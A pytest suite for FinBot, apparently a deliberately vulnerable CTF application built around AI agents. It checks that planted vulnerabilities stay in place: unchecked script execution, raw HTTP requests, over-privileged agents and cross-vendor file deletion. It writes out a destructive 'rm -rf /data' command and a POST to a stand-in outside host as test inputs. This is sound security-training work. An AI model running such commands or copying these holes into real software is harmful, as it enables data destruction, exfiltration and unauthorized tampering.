# ==============================================================================
# Planted Bugs Test Suite
# ==============================================================================
# User Story: As a maintainer, I want CI to fail when a pull request fixes one
#             of FinBot's intentional vulnerabilities, so that a well-meant
#             "fix" (often from an AI coding tool) can't quietly make a CTF
#             challenge unsolvable.
#
# Acceptance Criteria:
#   - Each test proves that one challenge's vulnerability still works by
#     calling the code directly: no model, no prompts, no exploit steps
#   - Each test is marked planted_bug("<challenge id>"), and that challenge
#     lists the code under test in planted_in
#   - A failure names the challenge and says the bug is intentional
#
# Test Categories:
#   PB-001: Scripts run unchecked (rce-shell-shock, rce-sleeper-agent)
#   PB-002: The co-pilot can make raw HTTP requests (data-exfil-carte-blanche)
#   PB-003: FinDrive deletes across vendors (destructive-vendor-vendetta)
#
# If one of these fails, your change fixed a bug that is there on purpose.
# Undo that part of the change. If you found a different, unintended bug,
# open an issue instead.
# ==============================================================================

from unittest.mock import patch

import pytest
from fastmcp import Client

from finbot.agents.chat import CoPilotAssistant
from finbot.agents.specialized.fraud import FraudComplianceAgent
from finbot.core.auth.session import session_manager
from finbot.mcp.factory import create_mcp_server
from finbot.mcp.servers.findrive.repositories import FinDriveFileRepository


def intentional(*challenges: str) -> str:
    """The failure message: which challenge broke, and what to do about it."""
    return (
        f"Intentional vulnerability (challenge: {', '.join(challenges)}). "
        "This bug is the challenge: please undo the change that fixed it."
    )


async def call_tool(server, name: str, **arguments) -> dict:
    """Call a tool through the MCP protocol, the way an agent does."""
    async with Client(server) as client:
        return (await client.call_tool(name, arguments)).data


@pytest.fixture
def session(db):
    return session_manager.create_session(email="planted@example.test")


# =============================================================================
# PB-001: Scripts Run Unchecked
# =============================================================================
@pytest.mark.planted_bug("rce-shell-shock", "rce-sleeper-agent")
@pytest.mark.asyncio
async def test_pb_001_execute_script_accepts_any_script(session):
    """The tool runs whatever it is given; the challenge's detector judges it."""
    server = await create_mcp_server("systemutils", session)

    result = await call_tool(server, "execute_script", script_content="rm -rf /data")

    assert result["status"] == "completed", intentional("rce-shell-shock", "rce-sleeper-agent")


@pytest.mark.planted_bug("rce-sleeper-agent")
@pytest.mark.asyncio
async def test_pb_001_fraud_agent_can_reach_system_tools(session):
    servers = await FraudComplianceAgent(
        session
    )._get_mcp_servers()  # pylint: disable=protected-access

    assert "systemutils" in servers, intentional("rce-sleeper-agent")


# =============================================================================
# PB-002: The Co-pilot Can Make Raw HTTP Requests
# =============================================================================
@pytest.mark.planted_bug("data-exfil-carte-blanche")
@pytest.mark.asyncio
async def test_pb_002_network_request_accepts_any_url(session):
    server = await create_mcp_server("systemutils", session)

    result = await call_tool(
        server, "network_request", url="https://outside.example/collect", method="POST", body="data"
    )

    assert result["status"] == "completed", intentional("data-exfil-carte-blanche")


@pytest.mark.planted_bug("data-exfil-carte-blanche")
def test_pb_002_copilot_is_connected_to_system_tools(session):
    """More capability than the role needs is the point of the challenge."""
    with patch("finbot.agents.chat.AsyncOpenAI"):
        copilot = CoPilotAssistant(session)

    assert (
        "systemutils" in copilot._get_mcp_server_types()
    ), intentional(  # pylint: disable=protected-access
        "data-exfil-carte-blanche"
    )


# =============================================================================
# PB-003: FinDrive Deletes Across Vendors
# =============================================================================
@pytest.mark.planted_bug("destructive-vendor-vendetta")
@pytest.mark.asyncio
async def test_pb_003_vendor_can_delete_another_vendors_file(vendor_pair_setup):
    """The web UI checks ownership; the assistant's FinDrive interface doesn't."""
    owner, other = vendor_pair_setup["s1"], vendor_pair_setup["s2"]
    file = FinDriveFileRepository(vendor_pair_setup["db"], owner).create_file(
        "contract.pdf", "Vendor Alpha contract", vendor_id=vendor_pair_setup["v1"].id
    )
    other.portal_type = "vendor"
    other.current_vendor_id = vendor_pair_setup["v2"].id
    server = await create_mcp_server("findrive", other)

    result = await call_tool(server, "delete_file", file_id=file.id)

    assert result["status"] == "deleted", intentional("destructive-vendor-vendetta")
